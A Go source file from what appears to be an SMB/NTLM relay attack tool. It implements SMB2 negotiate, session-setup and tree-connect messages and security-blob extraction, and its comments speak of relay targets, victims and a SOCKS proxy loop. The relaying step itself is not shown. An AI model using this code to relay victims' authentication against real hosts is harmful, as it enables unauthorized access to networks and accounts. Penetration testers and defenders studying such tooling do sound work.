package relay

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
)

// smbConn is a thin wrapper around a TCP connection to a relay target.
type smbConn struct {
	conn  net.Conn
	msgID uint64
}

func dialTarget(ip net.IP) (*smbConn, error) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip.String(), "445"), 5*time.Second)
	if err != nil {
		return nil, err
	}
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	return &smbConn{conn: conn}, nil
}

func (c *smbConn) close() { c.conn.Close() }

func (c *smbConn) send(body []byte) error {
	hdr := []byte{0x00, byte(len(body) >> 16), byte(len(body) >> 8), byte(len(body))}
	_, err := c.conn.Write(append(hdr, body...))
	return err
}

func (c *smbConn) recv() ([]byte, error) {
	nb := make([]byte, 4)
	if _, err := io.ReadFull(c.conn, nb); err != nil {
		return nil, err
	}
	msgLen := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
	if msgLen < 4 || msgLen > 1<<20 {
		return nil, fmt.Errorf("invalid message length %d", msgLen)
	}
	msg := make([]byte, msgLen)
	if _, err := io.ReadFull(c.conn, msg); err != nil {
		return nil, err
	}
	return msg, nil
}

func (c *smbConn) nextMsgID() uint64 {
	id := c.msgID
	c.msgID++
	return id
}

// consumeMsgIDs returns the next available MessageID and advances the counter
// by creditCharge (treating 0 as 1, per SMB2 spec).  Use this in the SOCKS
// proxy loop so that large-CreditCharge requests (e.g. READ with 16 credits)
// keep the relay session's msgID window in sync with what the server expects.
func (c *smbConn) consumeMsgIDs(creditCharge uint16) uint64 {
	if creditCharge < 1 {
		creditCharge = 1
	}
	id := c.msgID
	c.msgID += uint64(creditCharge)
	return id
}

// negotiate sends an SMB2 NEGOTIATE and returns the response or an error.
func (c *smbConn) negotiate() ([]byte, error) {
	if err := c.send(buildNegotiateReq(c.nextMsgID())); err != nil {
		return nil, err
	}
	resp, err := c.recv()
	if err != nil {
		return nil, err
	}
	if !isSMB2(resp) {
		return nil, fmt.Errorf("unexpected negotiate response (not SMB2)")
	}
	if st := smb2Status(resp); st != 0 {
		return nil, fmt.Errorf("negotiate rejected: 0x%08X", st)
	}
	return resp, nil
}

// sessionSetup sends an SMB2 SESSION_SETUP with secBlob and returns
// (response, sessionID, status, error).
func (c *smbConn) sessionSetup(sessionID uint64, secBlob []byte) ([]byte, uint64, uint32, error) {
	if err := c.send(buildSessionSetupReq(c.nextMsgID(), sessionID, secBlob)); err != nil {
		return nil, 0, 0, err
	}
	resp, err := c.recv()
	if err != nil {
		return nil, 0, 0, err
	}
	if !isSMB2(resp) || len(resp) < 48 {
		return nil, 0, 0, fmt.Errorf("unexpected session setup response")
	}
	status := smb2Status(resp)
	newSessionID := binary.LittleEndian.Uint64(resp[40:48])
	return resp, newSessionID, status, nil
}

// treeConnect sends SMB2 TREE_CONNECT for path and returns (treeID, error).
func (c *smbConn) treeConnect(sessionID uint64, path string) (uint32, error) {
	pathBytes := utf16le(path)
	pathOff := uint16(64 + 8) // header(64) + fixed body(8)

	hdr := smb2Hdr(0x0003, c.nextMsgID(), 0, sessionID, 0)
	var body []byte
	body = binary.LittleEndian.AppendUint16(body, 9)                    // StructureSize
	body = binary.LittleEndian.AppendUint16(body, 0)                    // Flags
	body = binary.LittleEndian.AppendUint16(body, pathOff)              // PathOffset
	body = binary.LittleEndian.AppendUint16(body, uint16(len(pathBytes))) // PathLength
	body = append(body, pathBytes...)

	if err := c.send(append(hdr, body...)); err != nil {
		return 0, err
	}
	resp, err := c.recv()
	if err != nil {
		return 0, err
	}
	if !isSMB2(resp) || len(resp) < 40 {
		return 0, fmt.Errorf("invalid tree connect response")
	}
	if st := smb2Status(resp); st != 0 {
		return 0, fmt.Errorf("0x%08X", st)
	}
	treeID := binary.LittleEndian.Uint32(resp[36:40])
	return treeID, nil
}

// --- helpers -----------------------------------------------------------------

func isSMB2(msg []byte) bool {
	return len(msg) >= 4 && msg[0] == 0xFE && msg[1] == 0x53 && msg[2] == 0x4D && msg[3] == 0x42
}

func isSMB1(msg []byte) bool {
	return len(msg) >= 4 && msg[0] == 0xFF && msg[1] == 0x53 && msg[2] == 0x4D && msg[3] == 0x42
}

func smb2Status(msg []byte) uint32 {
	if len(msg) < 12 {
		return 0xFFFFFFFF
	}
	return binary.LittleEndian.Uint32(msg[8:12])
}

// smb2Hdr builds a 64-byte SMB2 request header (Flags=0, client-to-server).
func smb2Hdr(cmd uint16, msgID uint64, status uint32, sessionID uint64, treeID uint32) []byte {
	h := make([]byte, 64)
	h[0] = 0xFE
	h[1] = 0x53
	h[2] = 0x4D
	h[3] = 0x42
	binary.LittleEndian.PutUint16(h[4:6], 64)          // StructureSize
	binary.LittleEndian.PutUint32(h[8:12], status)     // Status
	binary.LittleEndian.PutUint16(h[12:14], cmd)       // Command
	binary.LittleEndian.PutUint16(h[14:16], 31)        // CreditRequest
	binary.LittleEndian.PutUint32(h[16:20], 0)         // Flags (client-to-server)
	binary.LittleEndian.PutUint64(h[24:32], msgID)     // MessageId
	binary.LittleEndian.PutUint32(h[32:36], 0xFFFE)    // ProcessId
	binary.LittleEndian.PutUint32(h[36:40], treeID)    // TreeId
	binary.LittleEndian.PutUint64(h[40:48], sessionID) // SessionId
	return h
}

// smb2RespHdr builds a 64-byte SMB2 response header (SMB2_FLAGS_SERVER_TO_REDIR set).
// All messages sent FROM the relay engine TO the victim must use this builder.
func smb2RespHdr(cmd uint16, msgID uint64, status uint32, sessionID uint64) []byte {
	h := smb2Hdr(cmd, msgID, status, sessionID, 0)
	binary.LittleEndian.PutUint32(h[16:20], 0x00000001) // SMB2_FLAGS_SERVER_TO_REDIR
	return h
}

// buildNegotiateReq builds an SMB2 NEGOTIATE request.
// We advertise only SMB 2.0.2 and 2.1 — advertising SMB 3.x requires
// NegotiateContexts that we don't include, causing Windows to RST us.
func buildNegotiateReq(msgID uint64) []byte {
	dialects := []uint16{0x0202, 0x0210}
	hdr := smb2Hdr(0x0000, msgID, 0, 0, 0)
	var body []byte
	body = binary.LittleEndian.AppendUint16(body, 36)
	body = binary.LittleEndian.AppendUint16(body, uint16(len(dialects)))
	body = binary.LittleEndian.AppendUint16(body, 0x0001) // SecurityMode: signing enabled
	body = binary.LittleEndian.AppendUint16(body, 0)
	body = binary.LittleEndian.AppendUint32(body, 0x7F) // Capabilities
	body = append(body, make([]byte, 16)...)            // ClientGuid
	body = binary.LittleEndian.AppendUint64(body, 0)   // ClientStartTime
	for _, d := range dialects {
		body = binary.LittleEndian.AppendUint16(body, d)
	}
	return append(hdr, body...)
}

// buildSessionSetupReq builds an SMB2 SESSION_SETUP request wrapping secBlob.
func buildSessionSetupReq(msgID uint64, sessionID uint64, secBlob []byte) []byte {
	// Fixed body before SecurityBuffer:
	//   StructureSize(2) Flags(1) SecurityMode(1) Capabilities(4)
	//   Channel(4) SecurityBufferOffset(2) SecurityBufferLength(2) PreviousSessionId(8)
	// = 24 bytes
	secBufOff := uint16(64 + 24) // = 88

	hdr := smb2Hdr(0x0001, msgID, 0, sessionID, 0)
	var body []byte
	body = binary.LittleEndian.AppendUint16(body, 25)                   // StructureSize
	body = append(body, 0x00)                                            // Flags
	body = append(body, 0x01)                                            // SecurityMode: signing enabled
	body = binary.LittleEndian.AppendUint32(body, 0x7F)                 // Capabilities
	body = binary.LittleEndian.AppendUint32(body, 0)                    // Channel
	body = binary.LittleEndian.AppendUint16(body, secBufOff)            // SecurityBufferOffset
	body = binary.LittleEndian.AppendUint16(body, uint16(len(secBlob))) // SecurityBufferLength
	body = binary.LittleEndian.AppendUint64(body, 0)                    // PreviousSessionId
	body = append(body, secBlob...)
	return append(hdr, body...)
}

// extractSecBlobFromResp extracts the SecurityBuffer from an SMB2 SESSION_SETUP response.
// Response body layout: StructureSize(2) SessionFlags(2) SecurityBufferOffset(2) SecurityBufferLength(2)
func extractSecBlobFromResp(resp []byte) []byte {
	if len(resp) < 64+8 {
		return nil
	}
	body := resp[64:]
	secOff := binary.LittleEndian.Uint16(body[4:6])
	secLen := binary.LittleEndian.Uint16(body[6:8])
	end := int(secOff) + int(secLen)
	if end > len(resp) || secLen == 0 {
		return nil
	}
	return resp[secOff:end]
}

// extractSecBlobFromReq extracts the SecurityBuffer from an SMB2 SESSION_SETUP request.
// Request body layout: StructureSize(2) Flags(1) SecurityMode(1) Capabilities(4)
//
//	Channel(4) SecurityBufferOffset(2) SecurityBufferLength(2) PreviousSessionId(8)
func extractSecBlobFromReq(req []byte) []byte {
	// body starts at offset 64; SecurityBufferOffset and Length are at body+12 and body+14
	if len(req) < 64+16 {
		return nil
	}
	body := req[64:]
	secOff := binary.LittleEndian.Uint16(body[12:14])
	secLen := binary.LittleEndian.Uint16(body[14:16])
	end := int(secOff) + int(secLen)
	if end > len(req) || secLen == 0 {
		return nil
	}
	return req[secOff:end]
}

// utf16le encodes an ASCII/Latin-1 string as UTF-16LE bytes.
func utf16le(s string) []byte {
	b := make([]byte, len(s)*2)
	for i, c := range s {
		b[i*2] = byte(c)
		b[i*2+1] = 0
	}
	return b
}
